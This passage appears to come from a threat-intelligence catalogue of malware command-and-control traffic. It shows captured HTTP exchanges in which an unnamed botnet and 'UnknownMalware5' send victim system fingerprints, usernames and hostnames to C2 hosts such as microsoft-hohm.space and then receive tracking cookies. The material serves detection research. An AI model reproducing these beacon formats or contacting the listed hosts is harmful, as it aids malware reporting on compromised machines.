User-Agent: 94af05617f4e0479d766f422f611ad5c
Content-Length: 462
Host: nicholaspring.xyz:9998

vt=Intel%28R%29+Xeon%28R%29+CPU+E5%2D2630+v4+%40+2%2E20GHz&rk=1&dw=%5B%22HAPUBWS%22%5D&he=0&fj=&aw=%5B%22v1%2E0%2E3705%22%2C%22v1%2E1%2E4322%22%2C%22v2%2E0%2E50727%22%2C%22v3%2E0%22%2C%22v3%2E5%22%2C%22v4%2E0%2E30319%22%5D&zo=ddcf33e1f0649076576a7aaee8f83b66&tf=%5B%226%22%2C%221%22%2C%227601%22%2C%22Service+Pack+1%22%2C%22256%22%2C%221%22%2C%220%22%5D&it=0&rt=1%2E1%2E0&yj=1&bf=2TWgVlMc0b&sk=3144704&ys=C%3A%5CProgram+Files%5CInternet+Explorer%5Ciexplore%2EexeHTTP/1.1 200 OK
Date: Thu, 04 Apr 2019 14:57:08 GMT
Server: Apache/2.4.34 (Unix)
X-Powered-By: PHP/7.3.0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

2
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/unknownbotnet4.png "Unknownbotnet4")

#### UnknownMalware5
~~~
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.319.43
Referer: admin|USER-PC|DELL|DELL||84e59dc13aa07c2ef07c5302e65608
Host: microsoft-hohm.space
Connection: Keep-Alive

HTTP/1.1 201 Created
Server: nginx
Date: Tue, 07 Apr 2020 16:13:52 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Connection: keep-alive
Content-Encoding: identity
Set-Cookie: dkv=7c2f9a0a70cfb720d03e55719b955df4
Strict-Transport-Security: max-age=31536000;

GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.319.43
Cookie: dkv=7c2f9a0a70cfb720d03e55719b955df4
Host: microsoft-hohm.space

HTTP/1.1 404 Not Found
Server: nginx
Date: Tue, 07 Apr 2020 16:14:22 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Connection: keep-alive
Content-Encoding: identity
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/unknownmalware5.png "UnknownMalware5")
